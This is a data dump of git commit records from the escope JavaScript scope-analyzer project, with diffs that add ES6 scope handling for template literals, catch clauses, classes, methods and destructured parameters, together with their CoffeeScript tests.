1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal iterScope.variables[0]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'console'<\n>+        expect(scope.references[1].resolved).to.be.equal null<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-    function Scope(scopeManager<c> block<c> parent<c> opt) {<\n>-            (block.type === Syntax.Program) ? 'global' :<\n>-            (block.type === Syntax.BlockStatement) ? 'block' :<\n>-            (block.type === Syntax.ClassBody) ? 'class' : 'function';<\n>-        if (opt.naming) {<\n>-                new Scope(scopeManager<c> block<c> parent<c> { naming: true });<\n>-        // It may return false result. (for example<c> if node is the FunctionBody<c> it may return true under ES6 mode.)<\n>-        // But it will be filtered the subsequent exploring.<\n>-        if (this.__isScopeRequired(node<c> null)) {<\n>-            for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>-                scope = this.scopes[i];<\n>-                if (!scope.functionExpressionScope) {<\n>-                    if (scope.block === node) {<\n>-                        return scope;<\n>-                    }<\n>-    ScopeManager.prototype.__isES6 = function () {<\n>-        return this.__options.ecmaVersion >= 6;<\n>-    ScopeManager.prototype.__isScopeRequired = function (node<c> parent) {<\n>-        function isFunctionScopeRequired(node) {<\n>-            return node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration || node.type === Syntax.ArrowFunctionExpression;<\n>-        }<\n>-        function isVariableScopeRequired(node) {<\n>-            return node.type === Syntax.Program || isFunctionScopeRequired(node);<\n>-        }<\n>-        function isScopeRequired(node) {<\n>-            return isVariableScopeRequired(node) || node.type === Syntax.WithStatement || node.type === Syntax.CatchClause;<\n>-        }<\n>-        if (this.__isES6()) {<\n>-            if (node.type === Syntax.BlockStatement) {<\n>-                // In the current AST spec<c> these are represented as BlockStatement<c> but it's FunctionBody.<\n>-                if (parent && isFunctionScopeRequired(parent)) {<\n>-                    return false;<\n>-                }<\n>-                return true;<\n>-            }<\n>-            if (node.type === Syntax.ArrowFunctionExpression) {<\n>-                return true;<\n>-            }<\n>-            if (node.type === Syntax.ClassBody) {<\n>-                return true;<\n>-            }<\n>-        }<\n>-        return isScopeRequired(node);<\n>-                if (scopeManager.__isScopeRequired(node<c> parent)) {<\n>-                    new Scope(scopeManager<c> node<c> parent<c> {});<\n>-                        traverseIdentifierInPattern(node.left.declarations[0].id<c> function (pattern) {<\n>-                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                        });<\n>-                    currentScope.upper.__define(node.id<c> {<\n>-                    // WithStatement object is referenced at upper scope<\n>-                    currentScope.upper.__referencing(node.object);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,7,12,24 Nov 2014,Add comment for LetOrConst Declarations + direct call to eval ref #33 http://people.mozilla.org/~jorendorff/es6-draft.html#sec-performeval,0,0,1,4,374,+                    // Check this is direct call to eval<\n>+                        // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>+                        // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>,-                    // check this is direct call to eval<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,6,46,24 Nov 2014,Support Template Literal ref #33,0,1,1,68,3602,"+                case Syntax.TaggedTemplateExpression:<\n>+                    currentScope.__referencing(node.tag);<\n>+                    break;<\n>+                case Syntax.TemplateLiteral:<\n>+                    for (i = 0<c> iz = node.expressions.length; i < iz; ++i) {<\n>+                        currentScope.__referencing(node.expressions[i]);<\n>+                    }<\n>+                    break;<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 template literal'<c> -><\n>+    it 'refer variables'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            let i<c> j<c> k;<\n>+            function testing() { }<\n>+            let template = testing`testing ${i} and ${j}`<\n>+            return template;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 6<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        expect(scope.variables[2].name).to.be.equal 'j'<\n>+        expect(scope.variables[3].name).to.be.equal 'k'<\n>+        expect(scope.variables[4].name).to.be.equal 'testing'<\n>+        expect(scope.variables[5].name).to.be.equal 'template'<\n>+        expect(scope.references).to.have.length 5<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'template'<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'testing'<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'j'<\n>+        expect(scope.references[4].identifier.name).to.be.equal 'template'<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,6,36,24 Nov 2014,Add ES6 CatchClause ref #33,0,1,1,77,3742,"+                    traverseIdentifierInPattern(node.param<c> function (pattern) {<\n>+                        currentScope.__define(pattern<c> {<\n>+                            type: Variable.CatchClause<c><\n>+                            name: node.param<c><\n>+                            node: node<\n>+                        });<\n>+                case Syntax.ForOfStatement:<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 catch'<c> -><\n>+    it 'takes binding pattern'<c> -><\n>+        ast = harmony.parse """"""<\n>+        try {<\n>+        } catch ({ a<c> b<c> c<c> d }) {<\n>+            let e = 20;<\n>+            a;<\n>+            b;<\n>+            let c = 30;<\n>+            c;<\n>+            d;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.block.type).to.be.equal 'BlockStatement'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'catch'<\n>+        expect(scope.block.type).to.be.equal 'CatchClause'<\n>+        expect(scope.isStrict).to.be.false<\n>+        # FIXME After Esprima's bug is fixed<c> I'll add tests #33<\n>+        # https://github.com/estools/escope/issues/33#issuecomment-64135832<\n>+        #<\n>+        # expect(scope.variables).to.have.length 4<\n>+        # expect(scope.variables[0].name).to.be.equal 'a'<\n>+        # expect(scope.variables[1].name).to.be.equal 'b'<\n>+        # expect(scope.variables[2].name).to.be.equal 'c'<\n>+        # expect(scope.variables[3].name).to.be.equal 'd'<\n>+        # expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-                    currentScope.__define(node.param<c> {<\n>-                        type: Variable.CatchClause<c><\n>-                        name: node.param<c><\n>-                        node: node<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,6,18,24 Nov 2014,Always materialize ClassBody scope See https://github.com/estools/escope/issues/33#issuecomment-64134881 ref #33,0,0,3,122,5938,"+            (block.type === Syntax.ClassBody) ? 'class' : 'function';<\n>+            if (node.type === Syntax.ClassBody) {<\n>+                var i<c> iz<c> decl<c> variableTargetScope;<\n>+                switch (this.type()) {<\n>+                    currentScope.__referencing(node.superClass);<\n>+                case Syntax.ClassBody:<\n>+                    // ClassBody scope.<\n>+                    if (parent && parent.id) {<\n>+                        currentScope.__define(parent.id<c> {<\n>+                    break;<\n>+                case Syntax.ClassExpression:<\n>+                    currentScope.__referencing(node.superClass);<\n>+                    // Don't referencing variables when the parent type is ObjectPattern.<\n>+                    if (parent.type !== Syntax.ObjectExpression) {<\n>+                        break;<\n>+                    }<\n>+                    if (node.computed) {<\n>+                        currentScope.__referencing(node.key);<\n>+                    }<\n>+                    if (node.kind === 'init') {<\n>+                        currentScope.__referencing(node.value);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.MethodDefinition:<\n>+                    if (node.computed) {<\n>+                        currentScope.__referencing(node.key);<\n>+                    }<\n>+        expect(scope.block.type).to.be.equal 'ClassBody'<\n>+        expect(scope.block.type).to.be.equal 'ClassBody'<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        expect(scope.type).to.be.equal 'class'<\n>+        expect(scope.block.type).to.be.equal 'ClassBody'<\n>+        scope = scopeManager.scopes[2]<\n>+    it 'computed property key may refer variables'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var yuyushiki = 42;<\n>+            (class {<\n>+                [yuyushiki]() {<\n>+                }<\n>+                [yuyushiki + 40]() {<\n>+                }<\n>+            });<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 5<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'yuyushiki'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'yuyushiki'<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'class'<\n>+        expect(scope.block.type).to.be.equal 'ClassBody'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'yuyushiki'<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'yuyushiki'<\n>+    it 'computed property key may refer variables'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var yuyushiki = 42;<\n>+            ({<\n>+                [yuyushiki]() {<\n>+                }<c><\n>+                [yuyushiki + 40]() {<\n>+                }<\n>+            })<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'yuyushiki'<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'yuyushiki'<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'yuyushiki'<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'yuyushiki'<\n>",-            (block.type === Syntax.ClassDeclaration || block.type === Syntax.ClassExpression) ? 'class' : 'function';<\n>-            if (node.type === Syntax.ClassDeclaration || (node.type === Syntax.ClassExpression && node.id)) {<\n>-                var i<c> iz<c> decl<c> variableTargetScope<c> classOuterScope;<\n>-                switch (node.type) {<\n>-                    currentScope.upper.__define(node.id<c> {<\n>-                        type: Variable.ClassName<c><\n>-                        name: node.id<c><\n>-                        node: node<\n>-                    });<\n>-                    // Inner ClassBody scope.<\n>-                    currentScope.upper.__referencing(node.superClass);<\n>-                case Syntax.ClassExpression:<\n>-                    classOuterScope = (node.id) ? currentScope.upper : currentScope;<\n>-                    if (node.id) {<\n>-                        // Inner ClassBody scope.<\n>-                        currentScope.__define(node.id<c> {<\n>-                    classOuterScope.__referencing(node.superClass);<\n>-                    for (i = 0; i < node.properties.length; i++) {<\n>-                        if (node.properties[i].kind === 'init') {<\n>-                            currentScope.__referencing(node.properties[i].value);<\n>-                        }<\n>-                    }<\n>-        expect(scope.block.type).to.be.equal 'ClassDeclaration'<\n>-        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,5,43,24 Nov 2014,Support MethodDefinition and Objects method syntax ref #33,0,1,2,90,4222,"+    function isMethodDefinition(block<c> parent) {<\n>+        // Check<\n>+        // + Class MethodDefinition<\n>+        // + Object MethodDefiniton<\n>+        // cases.<\n>+        if (block.type !== Syntax.FunctionExpression) {<\n>+            return false;<\n>+        }<\n>+        if (!parent) {<\n>+            return false;<\n>+        }<\n>+        if (parent.type === Syntax.MethodDefinition && block === parent.value) {<\n>+            return true;<\n>+        }<\n>+        if (parent.type === Syntax.Property && parent.method && block === parent.value) {<\n>+            return true;<\n>+        }<\n>+        return false;<\n>+    }<\n>+    function isStrictScope(scope<c> block<c> parent) {<\n>+        if (parent) {<\n>+            if (isMethodDefinition(block<c> parent)) {<\n>+                return true;<\n>+            }<\n>+        }<\n>+    function Scope(scopeManager<c> block<c> parent<c> opt) {<\n>+            if (block.type === Syntax.FunctionExpression && block.id && !isMethodDefinition(block<c> parent)) {<\n>+                new Scope(scopeManager<c> block<c> parent<c> { naming: true });<\n>+        this.isStrict = isStrictScope(this<c> block<c> parent);<\n>+                    new Scope(scopeManager<c> node<c> parent<c> {});<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 object'<c> -><\n>+    it 'method definition'<c> -><\n>+        ast = harmony.parse """"""<\n>+        ({<\n>+            constructor() {<\n>+            }<\n>+        })<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-    function isStrictScope(scope<c> block) {<\n>-    function Scope(scopeManager<c> block<c> opt) {<\n>-            if (block.type === Syntax.FunctionExpression && block.id) {<\n>-                new Scope(scopeManager<c> block<c> { naming: true });<\n>-        this.isStrict = isStrictScope(this<c> block);<\n>-                    new Scope(scopeManager<c> node<c> {});<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,23,46,22 Nov 2014,Update URLs,0,0,2,15,1436,"+Escope ([escope](http://github.com/estools/escope)) is<\n>+scope analyzer extracted from [esmangle project](http://github.com/estools/esmangle).<\n>+[![Build Status](https://travis-ci.org/estools/escope.png?branch=master)](https://travis-ci.org/estools/escope)<\n>+Demonstration is [here](http://mazurov.github.io/escope-demo/) by [Sasha Mazurov](https://github.com/mazurov) (twitter: [@mazurov](http://twitter.com/mazurov)). [issue](https://github.com/estools/escope/issues/14)<\n>+- [Esmangle](https://github.com/estools/esmangle) is a minifier / mangler / optimizer.<\n>+  ""homepage"": ""http://github.com/estools/escope.html""<c><\n>+    ""url"": ""http://github.com/estools/escope.git""<\n>+      ""url"": ""http://github.com/estools/escope/raw/master/LICENSE.BSD""<\n>","-Escope ([escope](http://github.com/Constellation/escope)) is<\n>-scope analyzer extracted from [esmangle project](http://github.com/Constellation/esmangle).<\n>-[![Build Status](https://travis-ci.org/Constellation/escope.png?branch=master)](https://travis-ci.org/Constellation/escope)<\n>-Demonstration is [here](http://mazurov.github.io/escope-demo/) by [Sasha Mazurov](https://github.com/mazurov) (twitter: [@mazurov](http://twitter.com/mazurov)). [issue](https://github.com/Constellation/escope/issues/14)<\n>-  ""homepage"": ""http://github.com/Constellation/escope.html""<c><\n>-    ""url"": ""http://github.com/Constellation/escope.git""<\n>-      ""url"": ""http://github.com/Constellation/escope/raw/master/LICENSE.BSD""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,4,23,20 Nov 2014,Destructuring Assignments in Parameters ref #33,0,0,2,171,7462,"+                    // falls through<\n>+                        traverseIdentifierInPattern(node.params[i]<c> function (pattern) {<\n>+                            currentScope.__define(pattern<c> {<\n>+                                type: Variable.Parameter<c><\n>+                                name: pattern<c><\n>+                                node: node<c><\n>+                                index: i<\n>+                            });<\n>+    it 'ArrayPattern in parameters'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function ([a<c> b<c> c]) {<\n>+        }(array));<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'array'<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'a'<\n>+        expect(scope.variables[2].name).to.be.equal 'b'<\n>+        expect(scope.variables[3].name).to.be.equal 'c'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'SpreadElement in parameters'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function ([a<c> b<c> ...rest]<c> ...rest2) {<\n>+        }(array));<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'array'<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'a'<\n>+        expect(scope.variables[2].name).to.be.equal 'b'<\n>+        expect(scope.variables[3].name).to.be.equal 'rest'<\n>+        expect(scope.references).to.have.length 0<\n>+        # ast = harmony.parse """"""<\n>+        # (function ([a<c> b<c> ...[c<c> d<c> ...rest]]) {<\n>+        # }(array));<\n>+        # """"""<\n>+        # scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        # expect(scopeManager.scopes).to.have.length 2<\n>+        # scope = scopeManager.scopes[0]<\n>+        # globalScope = scope<\n>+        # expect(scope.type).to.be.equal 'global'<\n>+        # expect(scope.variables).to.have.length 0<\n>+        # expect(scope.references).to.have.length 0<\n>+        # expect(scope.implicit.left).to.have.length 1<\n>+        # expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        # scope = scopeManager.scopes[1]<\n>+        # expect(scope.type).to.be.equal 'function'<\n>+        # expect(scope.variables).to.have.length 6<\n>+        # for name<c> index in [<\n>+        #         'arguments'<\n>+        #         'a'<\n>+        #         'b'<\n>+        #         'c'<\n>+        #         'd'<\n>+        #         'rest'<\n>+        #     ]<\n>+        #     expect(scope.variables[index].name).to.be.equal name<\n>+        # expect(scope.references).to.have.length 6<\n>+        # for name<c> index in [<\n>+        #         'a'<\n>+        #         'b'<\n>+        #         'c'<\n>+        #         'd'<\n>+        #         'rest'<\n>+        #     ]<\n>+        #     expect(scope.references[index].identifier.name).to.be.equal name<\n>+        #     expect(scope.references[index].isWrite()).to.be.true<\n>+        #     expect(scope.references[index].partial).to.be.true<\n>+        # expect(scope.references[5].identifier.name).to.be.equal 'array'<\n>+        # expect(scope.references[5].isWrite()).to.be.false<\n>+    it 'ObjectPattern in parameters'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function ({<\n>+                shorthand<c><\n>+                key: value<c><\n>+                hello: {<\n>+                    world<\n>+                }<\n>+            }) {<\n>+        }(object));<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'object'<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'object'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'shorthand'<\n>+        expect(scope.variables[2].name).to.be.equal 'value'<\n>+        expect(scope.variables[3].name).to.be.equal 'world'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'complex pattern in parameters'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function ({<\n>+                shorthand<c><\n>+                key: [ a<c> b<c> c<c> d<c> e ]<c><\n>+                hello: {<\n>+                    world<\n>+                }<\n>+            }) {<\n>+        }(object));<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'object'<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'object'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 8<\n>+        for name<c> index in [<\n>+                'arguments'<\n>+                'shorthand'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'e'<\n>+                'world'<\n>+            ]<\n>+            expect(scope.variables[index].name).to.be.equal name<\n>+        expect(scope.references).to.have.length 0<\n>",-                    for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>-                        currentScope.__define(node.params[i]<c> {<\n>-                            type: Variable.Parameter<c><\n>-                            name: node.params[i]<c><\n>-          